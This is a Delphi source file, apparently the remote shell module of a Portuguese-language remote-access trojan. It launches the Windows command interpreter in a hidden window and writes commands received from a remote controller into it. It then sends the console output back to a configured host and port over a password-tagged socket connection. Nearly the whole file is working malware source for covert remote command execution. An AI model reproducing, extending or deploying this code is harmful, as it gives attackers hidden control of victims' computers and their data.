unit UnitShell;

interface

uses
  Windows,
  SocketUnit,
  UnitServerUtils;

procedure ShellThread;
procedure ShellGetVariaveis(xRandomStringClient, xHost, xSenha: string; xPort: integer);
procedure ShellGetComando(Str: string);

implementation

uses
  UnitComandos,
  UnitCryptString,
  UnitDiversos,
  UnitConexao,
  UnitDebug;

var
  RandomStringClient: string;
  Host: string;
  Port: integer;
  Senha: string;
  Comando: string;
  EnviarStreamText: string;

procedure ShellGetVariaveis(xRandomStringClient, xHost, xSenha: string; xPort: integer);
begin
  RandomStringClient := xRandomStringClient;
  Host := xHost;
  Port := xPort;
  Senha := xSenha;
end;

procedure ShellGetComando(Str: string);
begin
  Comando := Str;
end;

procedure EnviarStreamShell;
var
  CS : TClientSocket;
  buf: char;
  ToSend: string;
begin
  ToSend := EnviarStreamText;
  EnviarStreamText := '';
  CS := TClientSocket.Create;
  CS.Connect(Host, Port);
  sleep(10);
  if ToSend <> '' then
  EnviarTexto(CS, senha + '|Y|' + RESPOSTA + '|' + RandomStringClient + '|' + ToSend);
  sleep(1000);
  try
    CS.Disconnect(erro15);
    except
  end;
  while true do sleep(60000);
end;

procedure ShellThread;
const
  MAX_CHUNK: dword = 4096;
var
  Buffer: array [0..MaxBufferSize] of byte;
  SecurityAttributes: SECURITY_ATTRIBUTES;
  hiRead, hoRead, hiWrite, hoWrite: THandle;
  StartupInfo: TSTARTUPINFO;
  ProcessInfo: TProcessInformation;
  BytesRead, BytesWritten, ExitCode, PipeMode: dword;
  ComSpec:array [0..MAX_PATH] of char;
  ToSend, Tempstr: string;
  i: integer;
  c: cardinal;
begin
  EnviarStreamText := SHELLRESPOSTA + '|' + SHELLATIVAR + '|';
  CreateThread(nil, 0, @EnviarStreamShell, nil, 0, c);

  SecurityAttributes.nLength := SizeOf(SECURITY_ATTRIBUTES);
  SecurityAttributes.lpSecurityDescriptor := nil;
  SecurityAttributes.bInheritHandle := True;
  CreatePipe(hiRead, hiWrite, @SecurityAttributes, 0);
  CreatePipe(hoRead, hoWrite, @SecurityAttributes, 0);
  GetStartupInfo(StartupInfo);
  StartupInfo.hStdOutput := hoWrite;
  StartupInfo.hStdError := hoWrite;
  StartupInfo.hStdInput := hiRead;
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
  StartupInfo.wShowWindow := SW_HIDE;
  GetEnvironmentVariable('COMSPEC', ComSpec, sizeof(ComSpec));
  CreateProcess(nil, ComSpec, nil, nil, True, CREATE_NEW_CONSOLE, nil, nil, StartupInfo, ProcessInfo);
  CloseHandle(hoWrite);
  CloseHandle(hiRead);
  PipeMode := PIPE_NOWAIT;
  SetNamedPipeHandleState(hoRead, PipeMode , nil, nil);
  while true do
  begin
    Sleep(10);
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode <> STILL_ACTIVE then Break;
    ReadFile(hoRead, Buffer, MAX_CHUNK, BytesRead, nil);

    if BytesRead > 0 then
    begin
      for i := 0 to BytesRead - 1 do
      TempStr := Tempstr + string(char(buffer[i]));
    end else
    begin
      if TempStr <> '' then
      begin
        ToSend := SHELLRESPOSTA + '|' + SHELLRESPOSTA + '|' + TempStr;
        try
          EnviarStreamText := ToSend;
          CreateThread(nil, 0, @EnviarStreamShell, nil, 0, c);
          except
          break;
        end;
        TempStr := '';
      end;
    end;
    if comando <> '' then
    begin
      WriteFile(hiWrite, pchar(Comando)^, length(comando), BytesWritten, nil);
      WriteFile(hiWrite, #13#10, 2, BytesWritten, nil);
      comando := '';
    end;
  end;

  GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
  if ExitCode = STILL_ACTIVE then TerminateProcess(ProcessInfo.hProcess, 0);
  CloseHandle(hoRead);
  CloseHandle(hiWrite);

  ToSend := SHELLRESPOSTA + '|' + SHELLDESATIVAR + '|';
  EnviarStreamText := ToSend;
  EnviarStreamShell;
end;

end.
